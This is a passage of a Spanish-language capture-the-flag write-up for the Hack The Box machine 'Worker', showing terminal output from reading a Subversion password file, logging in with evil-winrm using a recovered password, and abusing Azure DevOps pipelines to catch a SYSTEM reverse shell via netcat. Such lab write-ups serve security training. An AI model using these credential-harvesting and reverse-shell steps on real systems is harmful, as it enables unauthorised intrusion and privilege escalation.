+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">c:\windows\system32\inetsrv&gt;net share
+net share
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share
+IPC$                                         Remote IPC
+W$           W:\                             Default share
+ADMIN$       C:\Windows                      Remote Admin
+The command completed successfully.
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">c:\windows\system32\inetsrv&gt;w:
+w:
+
+W:\&gt;dir
+dir
+ Volume in drive W is Work
+ Volume Serial Number is E82A-AEA8
+
+ Directory of W:\
+
+2020-06-16  18:59    &lt;DIR&gt;          agents
+2020-03-28  15:57    &lt;DIR&gt;          AzureDevOpsData
+2020-04-03  11:31    &lt;DIR&gt;          sites
+2020-06-20  16:04    &lt;DIR&gt;          svnrepos
+               0 File(s)              0 bytes
+               4 Dir(s)  18767577088 bytes free
+
+W:\&gt;
+</code></pre></div></div>
+<ul>
+<li>Vemos un <code>passwd</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">W:\&gt;cd svnrepos
+cd svnrepos
+
+W:\svnrepos&gt;dir
+dir
+ Volume in drive W is Work
+ Volume Serial Number is E82A-AEA8
+
+ Directory of W:\svnrepos
+
+2020-06-20  16:04    &lt;DIR&gt;          .
+2020-06-20  16:04    &lt;DIR&gt;          ..
+2020-06-20  11:29    &lt;DIR&gt;          www
+               0 File(s)              0 bytes
+               3 Dir(s)  18767577088 bytes free
+
+W:\svnrepos&gt;cd www
+cd www
+
+W:\svnrepos\www&gt;dir
+dir
+ Volume in drive W is Work
+ Volume Serial Number is E82A-AEA8
+
+ Directory of W:\svnrepos\www
+
+2020-06-20  11:29    &lt;DIR&gt;          .
+2020-06-20  11:29    &lt;DIR&gt;          ..
+2020-06-20  15:30    &lt;DIR&gt;          conf
+2020-06-20  15:52    &lt;DIR&gt;          db
+2020-06-20  11:29                 2 format
+2020-06-20  11:29    &lt;DIR&gt;          hooks
+2020-06-20  11:29    &lt;DIR&gt;          locks
+2020-06-20  11:29               251 README.txt
+               2 File(s)            253 bytes
+               6 Dir(s)  18767577088 bytes free
+
+W:\svnrepos\www&gt;cd conf
+cd conf
+
+W:\svnrepos\www\conf&gt;dir
+dir
+ Volume in drive W is Work
+ Volume Serial Number is E82A-AEA8
+
+ Directory of W:\svnrepos\www\conf
+
+2020-06-20  15:30    &lt;DIR&gt;          .
+2020-06-20  15:30    &lt;DIR&gt;          ..
+2020-06-20  11:29             1112 authz
+2020-06-20  11:29               904 hooks-env.tmpl
+2020-06-20  15:27             1031 passwd
+2020-04-04  20:51             4454 svnserve.conf
+               4 File(s)          7501 bytes
+               2 Dir(s)  18767577088 bytes free
+
+W:\svnrepos\www\conf&gt;
+</code></pre></div></div>
+<ul>
+<li>Vemos usuarios y contraseñas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">W:\svnrepos\www\conf&gt;type passwd
+type passwd
+### This file is an example password file for svnserve.
+### Its format is similar to that of svnserve.conf. As shown in the
+### example below it contains one section labelled [users].
+### The name and password for each user follow, one account per line.
+
+[users]
+nathen = wendel98
+nichin = fqerfqerf
+nichin = asifhiefh
+noahip = player
+nuahip = wkjdnw
+oakhol = bxwdjhcue
+owehol = supersecret
+paihol = painfulcode
+parhol = gitcommit
+pathop = iliketomoveit
+pauhor = nowayjose
+payhos = icanjive
+perhou = elvisisalive
+peyhou = ineedvacation
+phihou = pokemon
+quehub = pickme
+quihud = kindasecure
+rachul = guesswho
+raehun = idontknow
+ramhun = thisis
+ranhut = getting
+rebhyd = rediculous
+reeinc = iagree
+reeing = tosomepoint
+reiing = isthisenough
+renipr = dummy
+rhiire = users
+riairv = canyou
+ricisa = seewhich
+robish = onesare
+robisl = wolves11
+robive = andwhich
+ronkay = onesare
+rubkei = the
+rupkel = sheeps
+ryakel = imtired
+sabken = drjones
+samken = aqua
+sapket = hamburger
+sarkil = friday
+
+W:\svnrepos\www\conf&gt;
+</code></pre></div></div>
+<ul>
+<li>Vemos que el único usuario de interés es <code>robisl</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">W:\svnrepos\www\conf&gt;dir C:\Users\
+dir C:\Users\
+ Volume in drive C has no label.
+ Volume Serial Number is 32D6-9041
+
+ Directory of C:\Users
+
+2020-07-07  17:53    &lt;DIR&gt;          .
+2020-07-07  17:53    &lt;DIR&gt;          ..
+2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5
+2020-03-28  15:59    &lt;DIR&gt;          .NET v4.5 Classic
+2020-08-18  00:33    &lt;DIR&gt;          Administrator
+2020-03-28  15:01    &lt;DIR&gt;          Public
+2020-07-22  01:11    &lt;DIR&gt;          restorer
+2020-07-08  19:22    &lt;DIR&gt;          robisl
+               0 File(s)              0 bytes
+               8 Dir(s)  10459025408 bytes free
+
+W:\svnrepos\www\conf&gt;
+</code></pre></div></div>
+<ul>
+<li>El usuario forma parte del grupo <code>Remote Management Users</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">W:\svnrepos\www\conf&gt;net user robisl
+net user robisl
+User name                    robisl
+Full Name                    Robin Islip
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2020-04-05 21:27:26
+Password expires             Never
+Password changeable          2020-04-05 21:27:26
+Password required            No
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   2020-08-03 12:41:02
+
+Logon hours allowed          All
+
+Local Group Memberships      *Production           *Remote Management Use
+Global Group memberships     *None
+The command completed successfully.
+
+
+W:\svnrepos\www\conf&gt;
+</code></pre></div></div>
+<h2 id="user-flag">User flag</h2>
+<ul>
+<li>Ahora ya nos podemos conectar y ver la <code>flag</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content evil-winrm -i 10.10.10.203 -u 'robisl' -p 'wolves11'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\robisl\Documents&gt; whoami
+worker\robisl
+*Evil-WinRM* PS C:\Users\robisl\Desktop&gt; type user.txt
+2ce8a9d7ff7736acc3469f7274b2006a
+</code></pre></div></div>
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+<ul>
+<li>No vemos ningún privilegio ni nada interesante.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\robisl\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\robisl\Desktop&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= ==============================================
+worker\robisl S-1-5-21-3082756831-2119193761-3468718151-1330
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID                                            Attributes
+====================================== ================ ============================================== ==================================================
+Everyone                               Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+WORKER\Production                      Alias            S-1-5-21-3082756831-2119193761-3468718151-1018 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users        Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                   Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre></div></div>
+<ul>
+<li>Si recordamos tenemos credenciales y si nos conectamos al <code>devops.worker.htb</code> con las credenciales son validas.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/19.png">
+</p>
+
+<ul>
+<li>Formamos parte del grupo <code>Build Administrators</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/20.png">
+</p>
+
+<ul>
+<li><p>Podemos crear un <code>Pipeline</code>.</p>
+</li>
+<li><p>Después le damos en <code>PartsUnlimited</code>.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/21.png">
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/22.png">
+</p>
+
+<ul>
+<li><p>Podemos hacer un script en YAML.</p>
+</li>
+<li><p>Si vemos en la parte de script se están ejecutando comandos podemos hacer un <code>whoami</code> para ver quien es el que esta ejecutando el script.</p>
+</li>
+<li><p>Si le damos en <code>Save and Rune</code> vemos el mismo problema que teníamos antes.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/23.png">
+</p>
+
+<ul>
+<li>Así que vamos a crear una nueva rama.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/24.png">
+</p>
+
+<ul>
+<li>Pero obtenemos un error.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/25.png">
+</p>
+
+<ul>
+<li>Vemos que nos dicen sobre el <code>pool</code> que no existe default a si que tenemos que buscar uno que exista.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/26.png">
+</p>
+
+<ul>
+<li>Vamos a cambiar el <code>pool</code> y hacemos lo mismo de cambiar la rama.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/27.png">
+</p>
+
+<ul>
+<li>Si le damos a <code>Run</code> vemos que funciona.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/28.png">
+</p>
+
+<ul>
+<li>Si le damos <code>click</code> al <code>#....</code> vemos que lo ejecuta el usuario <code>nt authority\system</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/29.png">
+</p>
+
+<ul>
+<li><p>Vamos a editar el <code>Pipeline</code> para hacer todo lo anterior y enviarnos una <code>reverse shell</code>.</p>
+</li>
+<li><p>En mi caso volví a subir el <code>nc.exe</code> así que nos enviamos una reverse ahora.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ rlwrap nc -nlvp 443
+listening on [any] 443 ...
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/worker/30.png">
+</p>
+
+<ul>
+<li><p>Hacemos todo el proceso de antes de crear una nueva rama.</p>
+</li>
+<li><p>Después de que se procese todo nos llega la <code>shell</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ rlwrap nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.71] from (UNKNOWN) [10.10.10.203] 49935
+Microsoft Windows [Version 10.0.17763.1282]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+W:\agents\agent11\_work\8\s&gt;whoami
+whoami
+nt authority\system
+
+W:\agents\agent11\_work\8\s&gt;
+</code></pre></div></div>
+<h2 id="root-txt">Root.txt</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\&gt;type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+d3a78316ac7f36f03c0e6dd2ada48da9
+C:\&gt;
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
